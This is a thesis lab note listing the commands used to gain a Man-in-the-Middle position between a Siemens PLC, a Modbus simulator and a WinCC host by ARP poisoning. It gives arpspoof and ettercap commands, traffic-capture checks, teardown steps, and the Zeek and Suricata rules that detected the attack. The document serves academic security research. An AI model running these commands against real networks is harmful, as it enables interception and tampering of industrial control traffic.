# MiTM — ARP Poisoning Setup

Commands used in Chapter 6.3 of the thesis to establish a Man-in-the-Middle position
between OT devices via ARP cache poisoning.

---

## Lab network

| Device | IP | MAC |
|---|---|---|
| PLC S7-1200 | 192.168.0.50 | 8c:f3:19:a7:33:45 |
| ModRSsim2 | 192.168.0.10 | 00:e0:4c:34:29:68 |
| WinCC host | 192.168.0.20 | — |
| Kali (attacker) | 192.168.0.100 | — |

---

## Step 1 — Enable IP forwarding

```bash
# Required: without this, traffic is dropped instead of forwarded
echo 1 > /proc/sys/net/ipv4/ip_forward

# Verify
cat /proc/sys/net/ipv4/ip_forward   # should return 1
```

---

## Step 2 — ARP poisoning with arpspoof

### Scenario A: WinCC ↔ ModRSsim2 (Modbus TCP traffic)

```bash
# Terminal 1 — poison WinCC's ARP cache (tell WinCC that ModRSsim2's IP = attacker MAC)
arpspoof -i eth0 -t 192.168.0.20 192.168.0.10

# Terminal 2 — poison ModRSsim2's ARP cache (tell ModRSsim2 that WinCC's IP = attacker MAC)
arpspoof -i eth0 -t 192.168.0.10 192.168.0.20
```

### Scenario B: WinCC ↔ PLC S7-1200 (S7comm traffic)

```bash
# Terminal 1
arpspoof -i eth0 -t 192.168.0.20 192.168.0.50

# Terminal 2
arpspoof -i eth0 -t 192.168.0.50 192.168.0.20
```

---

## Alternative: Ettercap (integrated ARP poisoning + filter)

```bash
# Ettercap handles ARP poisoning and IP forwarding internally
# Use when combining MiTM with a Tampering filter (see ../ettercap/)

ettercap -T -q -M arp:remote /192.168.0.20// /192.168.0.10//
```

---

## Verification — confirm MiTM position

```bash
# Check ARP table on attacker — both target IPs should map to attacker's MAC
arp -n

# Capture traffic to confirm forwarding
tcpdump -i eth0 -n tcp port 502
tcpdump -i eth0 -n tcp port 102
```

---

## Teardown

```bash
# Stop arpspoof (Ctrl+C in both terminals)
# Restore IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# ARP caches restore automatically after TTL expiry (~60s)
# Or force restore manually:
arpspoof -i eth0 -t 192.168.0.20 -r 192.168.0.10
```

---

## Detection

ARP poisoning was detected by:
- Zeek `mitm-arp-detect.zeek` — rule 110200 (MITRE T1557, T1557.002)
- Suricata — rules 201200, 201300 (MAC address binding anomaly)

---

> **Disclaimer**: For use in isolated lab environments only.
